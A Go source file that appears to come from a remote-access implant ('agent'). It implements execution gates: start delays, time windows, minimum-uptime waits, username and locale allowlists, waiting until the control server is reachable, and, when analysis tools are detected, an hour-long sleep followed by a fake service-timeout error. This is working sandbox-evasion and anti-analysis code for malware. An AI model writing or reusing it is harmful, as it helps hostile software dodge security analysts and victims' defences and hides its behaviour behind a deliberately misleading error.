package agent

import (
	"context"
	"fmt"
	"log"
	"net"
	"net/url"
	"os"
	"os/user"
	"strings"
	"time"
)

type gateEnvironment interface {
	Now() time.Time
	Sleep(context.Context, time.Duration) error
	SystemUptime() (time.Duration, error)
	Username() string
	Locale() string
	WaitForInternet(context.Context, string) error
	IsAnalysisDetected() bool
}

type defaultGateEnvironment struct {
	logger *log.Logger
}

func (e defaultGateEnvironment) Now() time.Time {
	return time.Now()
}

func (e defaultGateEnvironment) Sleep(ctx context.Context, d time.Duration) error {
	if d <= 0 {
		return nil
	}
	return sleepContext(ctx, d)
}

func (e defaultGateEnvironment) SystemUptime() (time.Duration, error) {
	return systemUptime()
}

func (e defaultGateEnvironment) Username() string {
	current, err := user.Current()
	return resolveUsername(current, err)
}

func (e defaultGateEnvironment) Locale() string {
	return currentLocale()
}

func (e defaultGateEnvironment) IsAnalysisDetected() bool {
	return DetectAnalysis() != ""
}

func (e defaultGateEnvironment) WaitForInternet(ctx context.Context, address string) error {
	if strings.TrimSpace(address) == "" {
		return nil
	}
	backoff := time.Second
	dialer := &net.Dialer{Timeout: 5 * time.Second}
	for {
		conn, err := dialer.DialContext(ctx, "tcp", address)
		if err == nil {
			conn.Close()
			return nil
		}
		if ctx.Err() != nil {
			return ctx.Err()
		}
		if e.logger != nil {
			e.logger.Printf("connectivity check failed: %v", err)
		}
		if err := sleepContext(ctx, backoff); err != nil {
			return err
		}
		backoff = minDuration(backoff*2, 30*time.Second)
	}
}

func enforceExecutionGates(ctx context.Context, logger *log.Logger, gates ExecutionGates, serverURL string) error {
	if !gates.Enabled {
		return nil
	}
	env := defaultGateEnvironment{logger: logger}
	return enforceExecutionGatesWithEnv(ctx, env, gates, serverURL, logger)
}

func enforceExecutionGatesWithEnv(
	ctx context.Context,
	env gateEnvironment,
	gates ExecutionGates,
	serverURL string,
	logger *log.Logger,
) error {
	if !gates.Enabled {
		return nil
	}

	if gates.Delay > 0 {
		if err := env.Sleep(ctx, gates.Delay); err != nil {
			return err
		}
	}

	if gates.StartAfter != nil {
		for {
			now := env.Now()
			if !now.Before(*gates.StartAfter) {
				break
			}
			wait := gates.StartAfter.Sub(now)
			if wait <= 0 {
				break
			}
			if wait > time.Minute {
				wait = time.Minute
			}
			if err := env.Sleep(ctx, wait); err != nil {
				return err
			}
		}
	}

	if gates.EndBefore != nil && env.Now().After(*gates.EndBefore) {
		return fmt.Errorf("execution window expired at %s", gates.EndBefore.Format(time.RFC3339))
	}

	if gates.MinUptime > 0 {
		if uptime, err := env.SystemUptime(); err == nil {
			if uptime < gates.MinUptime {
				wait := gates.MinUptime - uptime
				if wait > 0 {
					if wait > 10*time.Minute {
						wait = 10 * time.Minute
					}
					if err := env.Sleep(ctx, wait); err != nil {
						return err
					}
				}
			}
		} else if logger != nil {
			logger.Printf("execution gate skipped uptime check: %v", err)
		}
	}

	if gates.EndBefore != nil && env.Now().After(*gates.EndBefore) {
		return fmt.Errorf("execution window expired at %s", gates.EndBefore.Format(time.RFC3339))
	}

	if len(gates.AllowedUsernames) > 0 {
		username := strings.ToLower(strings.TrimSpace(env.Username()))
		allowed := false
		for _, candidate := range gates.AllowedUsernames {
			normalizedCandidate := strings.ToLower(strings.TrimSpace(candidate))
			if normalizedCandidate == "" {
				continue
			}
			if normalizedCandidate == username {
				allowed = true
				break
			}
		}
		if !allowed {
			return fmt.Errorf("execution blocked for user %s", env.Username())
		}
	}

	if len(gates.AllowedLocales) > 0 {
		locale := strings.ToLower(strings.TrimSpace(env.Locale()))
		allowed := false
		for _, candidate := range gates.AllowedLocales {
			normalizedCandidate := strings.ToLower(strings.TrimSpace(candidate))
			if normalizedCandidate == "" {
				continue
			}
			if normalizedCandidate == locale {
				allowed = true
				break
			}
		}
		if !allowed {
			return fmt.Errorf("execution blocked for locale %s", locale)
		}
	}

	if gates.EndBefore != nil && env.Now().After(*gates.EndBefore) {
		return fmt.Errorf("execution window expired at %s", gates.EndBefore.Format(time.RFC3339))
	}

	if gates.RequireInternet {
		address, err := dialAddressFromURL(serverURL)
		if err != nil {
			if logger != nil {
				logger.Printf("execution gate skipped connectivity check: %v", err)
			}
			return nil
		}
		if err := env.WaitForInternet(ctx, address); err != nil {
			return err
		}
	}

	if gates.RequireNoAnalysis {
		if env.IsAnalysisDetected() {
			_ = env.Sleep(ctx, time.Hour)
			return fmt.Errorf("the service did not respond to the start or control request in a timely fashion")
		}
	}

	return nil
}

func dialAddressFromURL(raw string) (string, error) {
	if strings.TrimSpace(raw) == "" {
		return "", fmt.Errorf("empty server url")
	}
	parsed, err := url.Parse(raw)
	if err != nil {
		return "", err
	}
	host := parsed.Hostname()
	if host == "" {
		return "", fmt.Errorf("missing host in server url")
	}
	port := parsed.Port()
	if port == "" {
		port = "443"
	}
	return net.JoinHostPort(host, port), nil
}

func currentLocale() string {
	candidates := []string{
		os.Getenv("LC_ALL"),
		os.Getenv("LC_MESSAGES"),
		os.Getenv("LANG"),
	}
	for _, candidate := range candidates {
		trimmed := strings.TrimSpace(candidate)
		if trimmed == "" {
			continue
		}
		trimmed = strings.SplitN(trimmed, ".", 2)[0]
		trimmed = strings.SplitN(trimmed, "@", 2)[0]
		if trimmed != "" {
			return strings.ToLower(trimmed)
		}
	}
	return ""
}
